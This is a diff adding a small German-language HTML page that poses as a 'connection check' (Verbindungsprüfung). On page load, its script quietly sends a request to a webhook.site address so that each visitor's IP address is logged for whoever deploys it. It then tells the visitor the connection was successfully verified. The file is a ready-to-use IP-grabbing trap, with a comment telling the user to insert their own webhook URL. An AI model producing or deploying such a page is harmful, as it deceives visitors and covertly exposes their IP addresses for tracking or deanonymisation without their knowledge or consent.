@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verbindungsprüfung</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background-color: #f4f4f4;
+    color: #333;
+    margin: 0;
+    padding: 0;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    height: 100vh;
+  }
+  .container {
+    background: white;
+    padding: 2rem;
+    border-radius: 8px;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    text-align: center;
+    max-width: 400px;
+    width: 90%;
+  }
+  h1 {
+    font-size: 1.5rem;
+    margin-bottom: 1rem;
+  }
+  p {
+    font-size: 1rem;
+    margin-top: 1rem;
+  }
+</style>
+</head>
+<body>
+<div class="container">
+  <h1>Verbindungsprüfung</h1>
+  <p>Bitte einen Moment Geduld...</p>
+</div>
+
+<script>
+  // DEINE Webhook.site-URL hier einfügen:
+  const webhookUrl = "https://webhook.site/10c0d4b1-718c-4202-8962-3034849d8b3c";
+
+  // Anfrage senden, IP wird auf webhook.site geloggt
+  fetch(webhookUrl, { method: "GET", mode: "no-cors" })
+    .then(() => {
+      document.querySelector("p").textContent = "Verbindung erfolgreich überprüft. Vielen Dank!";
+    })
+    .catch(() => {
+      document.querySelector("p").textContent = "Fehler bei der Verbindungsprüfung.";
+    });
+</script>
+</body>
+</html>
